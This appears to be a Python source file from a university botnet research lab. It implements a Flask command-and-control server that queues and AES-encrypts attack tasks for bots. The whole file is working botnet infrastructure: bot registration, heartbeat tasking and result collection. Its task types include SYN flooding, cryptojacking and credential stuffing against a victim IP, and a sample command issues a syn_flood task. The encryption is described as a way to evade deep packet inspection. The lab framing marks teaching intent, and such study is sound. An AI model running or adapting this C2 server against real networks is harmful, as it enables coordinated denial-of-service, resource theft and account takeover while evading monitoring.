"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: AES-Encrypted C2 Server (Phase 1 upgrade)
 Environment: ISOLATED VM LAB ONLY
====================================================

Upgrade to c2_server.py: all commands encrypted with
AES-128-CBC before delivery to bots. Bot agents must
hold the shared key to decrypt task payloads.

Why encryption on an internal C2?
  - DPI cannot read task payloads in transit
  - If a bot is compromised, the task log is not readable
  - Research demonstration of command obfuscation

Key management in this demo:
  - Single shared key (pre-shared, compiled into bot)
  - Real botnets rotate keys via DGA or P2P updates

Usage: replaces c2_server.py on the C2 VM.
Bot agent uses crypto_utils.py to decrypt responses.
"""

import os
import sys
import json
import base64
import hashlib
import threading
import time
from datetime import datetime
from queue import Queue
from flask import Flask, request, jsonify

# ── Import AES from covert_bot.py or implement inline ─────────
# Reuse the pure-Python AES-CBC from covert_bot module.
# If covert_bot.py is in the same directory, import from it.
# Otherwise, the aes_cbc functions are duplicated below for standalone use.

try:
    from covert_bot import aes_cbc_encrypt, aes_cbc_decrypt, derive_key, derive_iv
    print("[C2-AES] Using AES from covert_bot module")
except ImportError:
    # Inline minimal AES for standalone use
    def _xor_bytes(a, b):
        return bytes(x ^ y for x, y in zip(a, b))

    def _pad(data, bs=16):
        p = bs - (len(data) % bs)
        return data + bytes([p]*p)

    def _unpad(data):
        if not data: return data
        p = data[-1]
        return data[:-p] if 0 < p <= 16 else data

    # Minimal AES-128-CBC using PyCryptodome if available, else warn
    try:
        from Crypto.Cipher import AES as _AES
        def aes_cbc_encrypt(pt, key, iv):
            cipher = _AES.new(key, _AES.MODE_CBC, iv)
            return cipher.encrypt(_pad(pt))
        def aes_cbc_decrypt(ct, key, iv):
            cipher = _AES.new(key, _AES.MODE_CBC, iv)
            return _unpad(cipher.decrypt(ct))
    except ImportError:
        def aes_cbc_encrypt(pt, key, iv):
            print("[WARN] PyCryptodome not found. Commands sent in plaintext.")
            return pt
        def aes_cbc_decrypt(ct, key, iv):
            return ct

    def derive_key(secret=b"AUA_LAB_2026_KEY"):
        return hashlib.sha256(secret).digest()[:16]
    def derive_iv(nonce=""):
        return hashlib.md5(nonce.encode()).digest()

# ── C2 shared key ─────────────────────────────────────────────
C2_SECRET    = b"AUA_LAB_2026_KEY"   # Must match AUTH_TOKEN logic in bot_agent.c
AES_KEY      = derive_key(C2_SECRET)
AUTH_TOKEN   = "LAB_RESEARCH_TOKEN_2026"

# ── Encryption helpers ────────────────────────────────────────

def encrypt_task(task: dict) -> dict:
    """
    Encrypt a task dict for delivery to a bot.
    Returns a wrapper dict with base64 ciphertext + nonce.
    The bot decrypts using the shared key + nonce.
    """
    nonce     = datetime.utcnow().strftime("%Y-%m-%d-%H-%M")
    iv        = derive_iv(nonce)
    plaintext = json.dumps(task).encode()
    ciphertext = aes_cbc_encrypt(plaintext, AES_KEY, iv)
    return {
        "enc":   1,
        "nonce": nonce,
        "data":  base64.b64encode(ciphertext).decode(),
    }

def decrypt_task(payload: dict) -> dict | None:
    """Decrypt a task payload (used for testing/logging)."""
    if not payload.get("enc"):
        return payload  # plaintext (legacy bot)
    try:
        nonce      = payload["nonce"]
        iv         = derive_iv(nonce)
        ciphertext = base64.b64decode(payload["data"])
        plaintext  = aes_cbc_decrypt(ciphertext, AES_KEY, iv)
        return json.loads(plaintext.decode())
    except Exception as e:
        return None

# ── Encrypted C2 server ───────────────────────────────────────

app = Flask(__name__)

REGISTERED_BOTS = {}
TASK_QUEUES     = {}
lock            = threading.Lock()

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[C2-AES {ts}] {msg}")

def auth(req):
    return req.headers.get("X-Auth-Token") == AUTH_TOKEN

@app.route("/register", methods=["POST"])
def register():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data   = request.get_json()
    bot_id = data.get("bot_id")
    if not bot_id:
        return jsonify({"error": "no bot_id"}), 400

    with lock:
        REGISTERED_BOTS[bot_id] = {
            "ip":        request.remote_addr,
            "hostname":  data.get("hostname", "unknown"),
            "arch":      data.get("arch", "unknown"),
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "heartbeat_count": 0,
            "supports_enc": data.get("enc", False),  # does this bot support AES?
        }
        TASK_QUEUES[bot_id] = Queue()

    log(f"NEW BOT id={bot_id} ip={request.remote_addr} enc={'yes' if data.get('enc') else 'no'}")
    return jsonify({"status": "registered", "bot_id": bot_id, "enc": True})

@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data   = request.get_json()
    bot_id = data.get("bot_id")

    with lock:
        if bot_id not in REGISTERED_BOTS:
            return jsonify({"error": "unknown bot"}), 404
        REGISTERED_BOTS[bot_id]["last_seen"] = datetime.now().isoformat()
        REGISTERED_BOTS[bot_id]["heartbeat_count"] += 1
        task = None
        if not TASK_QUEUES[bot_id].empty():
            task = TASK_QUEUES[bot_id].get()

    if task:
        bot_info = REGISTERED_BOTS.get(bot_id, {})
        supports_enc = bot_info.get("supports_enc", False)

        if supports_enc:
            encrypted = encrypt_task(task)
            log(f"HEARTBEAT id={bot_id} → ENCRYPTED task={task['type']}")
            return jsonify({"task": encrypted})
        else:
            log(f"HEARTBEAT id={bot_id} → PLAINTEXT task={task['type']} (legacy bot)")
            return jsonify({"task": task})
    else:
        log(f"HEARTBEAT id={bot_id} → idle")
        return jsonify({"task": None})

@app.route("/result", methods=["POST"])
def result():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data   = request.get_json()
    bot_id = data.get("bot_id")
    result_payload = data.get("result", "")
    # If result is encrypted, decrypt for logging
    if isinstance(result_payload, dict) and result_payload.get("enc"):
        decrypted = decrypt_task(result_payload)
        log(f"RESULT (decrypted) id={bot_id}  {json.dumps(decrypted)[:120]}")
    else:
        log(f"RESULT id={bot_id}  {json.dumps(result_payload)[:120]}")
    return jsonify({"status": "received"})

@app.route("/bots", methods=["GET"])
def list_bots():
    with lock:
        return jsonify({k: v.copy() for k, v in REGISTERED_BOTS.items()})

@app.route("/task", methods=["POST"])
def push_task():
    """
    Push encrypted task to one or all bots.

    Required fields:
      bot_id      : "all" or a specific bot_id string
      type        : task type (see below)

    Common optional fields (passed through verbatim to the bot):
      target_ip   : victim IP          (default 192.168.100.20)
      target_port : victim port        (default 80)
      duration    : seconds            (default 10)

    Type-specific optional fields (forwarded to bot unchanged):
      cpu         : float 0-1          cryptojack CPU fraction (default 0.25)
      mode        : "bot"|"jitter"|"distributed"  cred_stuffing mode (default "jitter")
      jitter      : int ms             cred_stuffing jitter std-dev (default 200)
      workers     : int                cred_stuffing distributed threads (default 3)

    All fields present in the request body are passed through to the task dict
    so bots always receive the full parameterisation the operator intended.
    """
    data   = request.get_json()
    bot_id = data.get("bot_id", "all")

    # Base fields
    task = {
        "type":        data.get("type", "idle"),
        "target_ip":   data.get("target_ip", "192.168.100.20"),
        "target_port": data.get("target_port", 80),
        "duration":    data.get("duration", 10),
        "issued_at":   datetime.now().isoformat(),
    }

    # Pass through all type-specific optional fields if present
    for field in ("cpu", "mode", "jitter", "workers"):
        if field in data:
            task[field] = data[field]
    with lock:
        targets = list(REGISTERED_BOTS.keys()) if bot_id == "all" else [bot_id]
        for tid in targets:
            if tid in TASK_QUEUES:
                TASK_QUEUES[tid].put(task)

    log(f"TASK QUEUED type={task['type']} target={bot_id} → will be encrypted on delivery")
    return jsonify({"status": "queued", "task": task, "targets": targets})

@app.route("/encrypt_test", methods=["POST"])
def encrypt_test():
    """Debug endpoint: show encryption of a sample task."""
    task = request.get_json() or {"type": "idle"}
    enc  = encrypt_task(task)
    dec  = decrypt_task(enc)
    return jsonify({
        "original": task,
        "encrypted": enc,
        "decrypted": dec,
        "key_hex": AES_KEY.hex(),
    })

if __name__ == "__main__":
    print("=" * 60)
    print(" Encrypted C2 Server - AUA Botnet Research Lab")
    print(" AES-128-CBC task encryption enabled")
    print(" ISOLATED ENVIRONMENT ONLY")
    print(" Listening on 0.0.0.0:5000")
    print("=" * 60)
    print(f"\n[C2-AES] AES key: {AES_KEY.hex()}")
    print(f"[C2-AES] (Same key must be in bot_agent for decryption)")
    print(f"\nTest encryption:")
    print(f"  curl -X POST http://localhost:5000/encrypt_test \\")
    print(f"       -H 'Content-Type: application/json' \\")
    print(f"       -d '{{\"type\":\"syn_flood\",\"target_ip\":\"192.168.100.20\"}}'")
    print()
    app.run(host="0.0.0.0", port=5000, debug=False)